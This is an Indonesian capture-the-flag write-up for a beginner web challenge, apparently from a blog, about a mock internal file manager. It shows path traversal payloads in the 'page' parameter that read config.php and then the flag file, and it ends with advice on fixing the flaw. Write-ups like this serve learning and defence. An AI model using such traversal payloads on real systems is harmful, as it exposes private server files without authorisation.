---
title: "W1-C2 Manajer Berkas Internal"
author: azizul-manal-gaumalanga
tags: [web, zero-day-2026]
image: images/oxucl-logo.jpg
---

## Detail Soal

| Field | Value |
|-------|-------|
| Nama Challenge | W1-C2: Manajer Berkas Internal |
| Kategori | Web Breach |
| Event | ZERO DAY Mini Games 2026 |
| Poin | 100 |
| Difficulty | Beginner |
| Target | Website Manajer Berkas Internal PT Cahaya Nusantara |

## Deskripsi Singkat

Pada challenge ini diberikan sebuah website manajemen berkas internal milik PT Cahaya Nusantara. Website tersebut digunakan untuk menampilkan beberapa dokumen internal seperti halaman beranda, dokumen, laporan, dan panduan.

Dari narasi soal dijelaskan bahwa sistem menggunakan parameter URL untuk menentukan berkas yang ditampilkan. Catatan soal juga memberikan petunjuk bahwa validasi yang tidak sempurna dapat membuka akses ke seluruh sistem. Berdasarkan petunjuk tersebut, kemungkinan besar terdapat celah pada proses pembacaan file melalui parameter URL.

## Analisis Awal

Saat membuka halaman utama, terlihat bahwa website menampilkan isi file `welcome.txt`. Pada menu navigasi, setiap halaman dipanggil menggunakan parameter `page`, contohnya:

```txt
?page=welcome.txt
?page=dokumen.txt
?page=laporan.txt
?page=panduan.txt
```

Hal ini menunjukkan bahwa aplikasi membaca file berdasarkan nilai dari parameter `page`.

Kemudian saya memeriksa source code halaman dan menemukan komentar HTML berikut:

```html
<!-- Konfigurasi: lihat /var/www/html/config.php untuk referensi path flag_file -->
```

Komentar tersebut menjadi petunjuk penting karena memberitahu bahwa file konfigurasi berada di:

```txt
/var/www/html/config.php
```

Selain itu, file tersebut juga disebut berisi referensi menuju lokasi file flag.

## Langkah Penyelesaian

Langkah pertama adalah mencoba membaca file `config.php` menggunakan teknik path traversal melalui parameter `page`.

Payload yang digunakan:

```txt
?page=../../../../var/www/html/config.php
```

Setelah payload tersebut dijalankan melalui browser, isi file `config.php` berhasil ditampilkan. Di dalam file tersebut ditemukan konfigurasi berikut:

```php
<?php
// config.php  -  Konfigurasi Sistem Manajer Berkas Internal
// File ini berisi konfigurasi path dan pengaturan aplikasi.

// Path ke direktori halaman
define('PAGES_DIR', '/var/www/html/pages/');

// Path token autentikasi sistem
$flag_file = '/var/www/private/flag.txt';

// Pengaturan tampilan
define('APP_NAME', 'Manajer Berkas Internal');
define('APP_VERSION', '1.4.2');
define('COMPANY', 'PT Cahaya Nusantara');
```

Dari file konfigurasi tersebut, diketahui bahwa lokasi flag berada di:

```txt
/var/www/private/flag.txt
```

Setelah mengetahui lokasi flag, saya kembali menggunakan parameter `page` untuk membaca file tersebut:

```txt
?page=../../../../var/www/private/flag.txt
```

Payload tersebut berhasil menampilkan isi file flag pada halaman website. Setelah flag didapatkan, flag kemudian disubmit ke platform dan berhasil diterima.

## Flag

```txt
DSG{...}
```

## Kesimpulan / Hal yang Dipelajari

Challenge ini memanfaatkan kerentanan **Local File Inclusion** atau **Path Traversal**. Kerentanan terjadi karena aplikasi menerima input dari parameter `page` untuk menentukan file yang akan dibaca, tetapi tidak membatasi akses hanya ke direktori file yang seharusnya.

Akibatnya, pengguna dapat menggunakan pola `../` untuk keluar dari direktori halaman dan membaca file lain di server, termasuk file konfigurasi dan file flag. Dari challenge ini dapat dipelajari bahwa validasi path sangat penting pada fitur pembacaan file. Aplikasi seharusnya menggunakan whitelist file yang boleh diakses, membatasi direktori kerja, serta mencegah penggunaan traversal sequence seperti `../`.
